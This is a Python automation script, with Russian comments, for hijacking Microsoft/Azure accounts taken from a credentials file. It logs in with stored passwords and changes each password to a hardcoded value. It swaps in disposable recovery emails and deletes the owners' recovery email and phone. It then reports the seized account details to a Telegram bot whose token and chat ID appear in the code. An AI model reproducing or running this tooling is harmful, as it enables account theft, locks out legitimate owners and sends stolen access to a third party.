import keyboard, random
from pyautogui import*
from tqdm import tqdm
import requests, time
from datetime import*
from keyboard import*
import time
from mailtm import*
def listener(message):
    global subject; global text
    print("\nSubject: " + message['subject'])
    print("Content: " + message['text'] if message['text'] else message['html'])
    security_code = "Content: " + message['text'] if message['text'] else message['html']
    subject = "\nSubject: " + message['subject']
    text = message['text']
    print('это сек код тест', text) #api почта функция
subject = str();
text = str()
print('На данный момент использовать только под почту "Microsoft" ! \n'
      'Также убедись, что подгрузил файл с акками и айпишками в "accs_gruzit_pod_rdp.txt"')
accs_file_inf = open('accs_gruzit_pod_rdp.txt')
data_of_accs_inf = accs_file_inf.read()
list_of_accs_inf = data_of_accs_inf.split('\n')

response = requests.get('https://api.ipify.org')
ip_address = response.text
print(f'Your IP Address is {ip_address}')
for i in range(len(list_of_accs_inf)):
    if ip_address in list_of_accs_inf[i]:
        account_email = list_of_accs_inf[i][:list_of_accs_inf[i].find('\t')]
        account_password = list_of_accs_inf[i][list_of_accs_inf[i].find('\t') + 1:list_of_accs_inf[i].rfind('\t')]
        stroka_acca = list_of_accs_inf[i]
        print('Аккаунт найден:', list_of_accs_inf[i], ' - положение в таблице || \n')
        print('Текущая выдача данных: ', account_email, account_password, ip_address, '|| Сверка пройдена!')
        print('Даю время на валидацию и начинаю... (30 seconds)');
        break
for i in tqdm(range(100)):
    time.sleep(0.3)
click(1018, 770, 1, 0, 'left'); sleep(3); click(1018, 770, 1, 0, 'left'); sleep(3); click(693, 714, 1, 0, 'left'); sleep(3); click(700, 737, 1, 0, 'left'); sleep(3) # завершаем настройку хрома
click(981, 27, 1, 0, 'left'); sleep(3) # хром на полный экран
click(172, 58, 1, 0, 'left'); keyboard.write('portal.azure.com', 0,1); keyboard.send('enter'); sleep(12) # ввод azure.microsoft.com
#click(1153, 184, 1, 0, 'left'); sleep(10) # sign in UNITED KINGDOM
click(1153, 115, 1, 0, 'left'); sleep(10) # sign in UNITED STATES
click(475, 414, 1, 0, 'left'); keyboard.write(account_email, delay=0.2); sleep(1); click(720, 538, 1, 0, 'left'); sleep(3) # email input
click(475, 482, 1, 0, 'left'); click(475, 500, 1, 0, 'left'); keyboard.write(account_password, delay=0.2); sleep(1); click(717, 606, 1, 0, 'left'); sleep(5) # password input
click(1020, 366, 1, 0, 'left') # отменить сохранение данных лог пасса
sleep(2); click(719, 596, 1, 0, 'left'); sleep(30) # password save and stay sign in
click(1076, 107, 1, 0, 'left'); sleep(8); click(1058, 249, 1, 0, 'left'); sleep(12); click(713, 768, 1, 0, 'left'); sleep(20); # переходим в настройки акка из
# панели азура
click(724, 678, 1, 0, 'left');
click(724, 658, 1, 0, 'left');
click(714, 777, 1, 0, 'left');
click(724, 778, 1, 0, 'left');
click(724, 768, 1, 0, 'left');
click(724, 688, 1, 0, 'left'); sleep(20); # СКИПАЕМ ОКНО A quick note about your Microsoft account
#click(880, 332, 1, 0, 'left'); click(880, 250, 1, 0, 'left'); click(880, 275, 1, 0, 'left'); click(880, 335, 1, 0, 'left'); sleep(8) # нажимаем изменить пасс кнопку UNITED KINGDOM
click(880, 210, 1, 0, 'left'); click(880, 200, 1, 0, 'left'); click(880, 262, 1, 0, 'left'); sleep(8) # нажимаем изменить пасс кнопку UNITED STATES and russia
click(454, 567, 1, 0, 'left'); sleep(4);
reserve_mail_first = account_email[:account_email.find('@')] + '@mailnesia.com';
#===========
test = reserve_mail_first
itog_test = ''
while '-' in test or '_' in test:
    if '_' in test:
        itog_test = test[:test.find('_')] + test[test.find('_') + 1:]
    elif '-' in test:
        itog_test = test[:test.find('-')] + test[test.find('-') + 1:]
    test = itog_test
print(itog_test)
#==========
click(537, 452, 1, 0, 'left'); sleep(4); # кликаем по мыло маилфорспам
click(453, 511, 1, 0, 'left'); sleep(4); keyboard.write(test, delay=0.1); sleep(4) # вводим резерв
click(719, 600, 1, 0, 'left'); sleep(4); #отправляем код на резерв почту
click(526, 20, 1, 0, 'left'); sleep(4); #создаем новую вкладку
click(178, 63, 1, 0, 'left'); sleep(4); keyboard.write('mailnesia.com', delay=0.1); press('enter'); sleep(8); press('f5'); sleep(8) #кликаем на ввод резерва в поиске браузера и вводим
#click(349, 599, 1, 0, 'left'); sleep(3);  click(396, 794, 1, 0, 'left'); sleep(10); # на случай если вылезет Your connection is not private
click(798, 143, 1, 0, 'left'); keyboard.write(test, delay=0.1); sleep(4); click(1090, 142, 1, 0, 'left'); sleep(8) # вводим резерв и кликаем чек форспам
click(177, 373, 1, 0, 'left'); sleep(4); #кликаем на письмо
click(116, 582, 2, 0, 'left'); sleep(4); #кликаем на код 2 раза и выделяем его
hotkey('ctrl', 'c'); sleep(2); click(370, 22, 1, 0, 'left'); sleep(4); click(460, 508, 1, 0, 'left'); sleep(2); hotkey('ctrl', 'v'); # копируем и вставляем
click(725, 600, 1, 0, 'left'); sleep(4) # нажимаем верифи
click(457, 613, 1, 0, 'left'); sleep(11) # Break free from your passwords
click(97, 297, 1, 0, 'left'); keyboard.write(account_password, delay=0.1); sleep(1.5) # вводим старый пасс
click(88, 388, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 1
click(102, 489, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 2
click(110, 629, 1, 0, 'left'); sleep(18) # подтверждаем изменение пасса
press('f5'); sleep(20) # refresh page
#click(1020, 366, 1, 0, 'left'); sleep(4) # отменить сохранение данных лог пасса
#click(490, 485, 1, 0, 'left');
click(446, 482, 1, 0, 'left');
keyboard.write('56981488228Simak', delay=0.2); click(717, 645, 1, 0, 'left'); click(717, 655, 1, 0, 'left'); click(717, 635, 1, 0, 'left'); sleep(2)
click(717, 590, 1, 0, 'left')
click(717, 610, 1, 0, 'left')
click(718, 600, 1, 0, 'left')
sleep(20) # перелогин на случай вылета из панели
click(726, 543, 1, 0, 'left'); sleep(8) # advanced sec options
click(259, 750, 1, 0, 'left'); sleep(8) # add a new way to sign in
click(518, 417, 1, 0, 'left'); sleep(8) # жмем на выбор мыла

# Get Domains # НАЧИНАЕМ ЮЗАТЬ ПОЧТУ ПОД АКК
test = Email()
print("\nDomain: " + test.domain)
# Make new email address
test.register(username=None, password='1534589', domain=None)
print("\nEmail Adress: " + str(test.address))
email_reserve = test.address; sleep(3)
keyboard.write(email_reserve, delay=0.1); sleep(2); click(658, 400, 1, 0, 'left'); sleep(8) # вводим резерв почту и нажимаем ок
# Start listening
test.start(listener, interval=3)
print("\nWaiting for new emails...")
#time.sleep(45)
print(text, 'проверка на наличие кода')
while text == '':
    time.sleep(3)
#print(text, 'проверка на наличие кода')
test.stop()
list_of_text = text.split('\n')
for i in range(len(list_of_text)):
    if 'Security code' in list_of_text[i]:
            security_code = list_of_text[i]
security_code_ready = str()
for i in range(len(security_code)):
    if security_code[i].isdigit():
        security_code_ready += security_code[i]
print(security_code_ready)
keyboard.write(security_code_ready, delay=0.2); sleep(5); click(681, 385, 1, 0, 'left'); sleep(10) # вводим сек КОД
click(578, 625, 1, 0, 'left'); sleep(7); click(328, 838, 1, 0, 'left'); sleep(7); click(698, 535, 1, 0, 'left'); sleep(10); click(679, 526, 1, 0, 'left'); sleep(8); # удаляем мыло форспам
sleep(2)
scroll(-400); sleep(4)
click(278, 357, 1, 0, 'left'); sleep(7); click(341, 577, 1, 0, 'left'); sleep(10); click(683, 541, 1, 0, 'left'); sleep(10); click(678, 534, 1, 0, 'left'); sleep(10); # удаляем сот тел
click(146, 17, 1, 0, 'left'); sleep(5); click(139, 114, 1, 0, 'left'); # переход на гл странницу
click(231, 253, 1, 0, 'left'); sleep(5); click(894, 106, 1, 0, 'left'); # вм и колокольчик

################# ОТПРАВЛЕНИЕ ДАННЫХ В ТГ БОТ BOTINOK
TOKEN = "6619003611:AAGRivvPR1q5XZbnNh0RgZ5Y86_FBlpkTOE"
now_time = str(datetime.now())
chat_id = '506640934'
message ='===================\n' + '[RDP] POSTAVIL NA ACC: \n' + stroka_acca + '\n' +  now_time + '\n' +  email_reserve + '\n===================\n'
url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
print(requests.get(url).json()) # Эта строка отсылает сообщение
##################
print('ГОТОВО. АККАУНТ ЗАПРИВАЧЕН)\n\n'
      'резервная почта аккаунта:', email_reserve)
sleep(17200)
